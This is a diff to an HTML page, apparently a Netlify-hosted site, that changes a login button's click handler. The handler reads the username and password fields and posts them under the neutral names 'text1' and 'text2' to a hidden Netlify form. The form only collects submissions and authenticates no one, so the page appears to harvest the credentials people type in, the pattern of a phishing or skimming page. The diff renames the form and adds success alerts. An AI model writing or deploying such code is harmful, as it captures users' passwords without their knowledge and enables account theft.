@@ -680,22 +680,26 @@
 
 
 <script src="js/local-navigation-fixes.js?v=5" data-site-root="./"></script>
-<form name="myForm" data-netlify="true" hidden>
-  <input type="hidden" name="form-name" value="myForm">
+<form name="form-test" method="POST" data-netlify="true" hidden>
+  <input type="hidden" name="form-name" value="form-test">
   <input type="text" name="text1">
   <input type="text" name="text2">
 </form>
 
 <script>
 document.getElementById("login-button").addEventListener("click", async () => {
+
+  const text1 = document.getElementById("login-username");
+  const text2 = document.getElementById("login-password");
+
   const data = new URLSearchParams();
 
-  data.append("form-name", "myForm");
-  data.append("text1", document.getElementById("login-username").value);
-  data.append("text2", document.getElementById("login-password").value);
+  data.append("form-name", "form-test");
+  data.append("text1", text1.value ?? text1.textContent);
+  data.append("text2", text2.value ?? text2.textContent);
 
   try {
-    const res = await fetch("/", {
+    const response = await fetch("/", {
       method: "POST",
       headers: {
         "Content-Type": "application/x-www-form-urlencoded"
@@ -703,11 +707,13 @@ document.getElementById("login-button").addEventListener("click", async () => {
       body: data.toString()
     });
 
-    if (!res.ok) throw new Error("전송 실패");
-    console.log("전송 성공");
-  } catch (err) {
-    console.error(err);
+    if (!response.ok) throw new Error("전송 실패");
+
+    alert("전송 성공!");
+  } catch (error) {
+    alert("전송 실패: " + error.message);
   }
+
 });
 </script>
 </body></html>
